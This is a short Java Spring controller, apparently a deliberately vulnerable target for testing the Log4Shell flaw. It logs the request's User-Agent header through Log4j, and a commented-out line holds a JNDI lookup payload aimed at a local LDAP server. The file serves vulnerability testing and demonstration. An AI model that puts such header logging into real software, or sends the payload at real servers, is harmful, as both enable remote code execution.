package com.example.targetlog4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

@RestController
public class HelloController {

    private Logger log = LogManager.getLogger(this.getClass());


    @RequestMapping("/test")
    public String index(HttpServletRequest request) {

        log.info("An INFO Message {}", request.getHeader("User-Agent"));
//        log.info("{}", "${jndi:ldap://127.0.0.1:8099/sample}");


        return "Howdy! Check out the Logs to see the output...";
    }
}
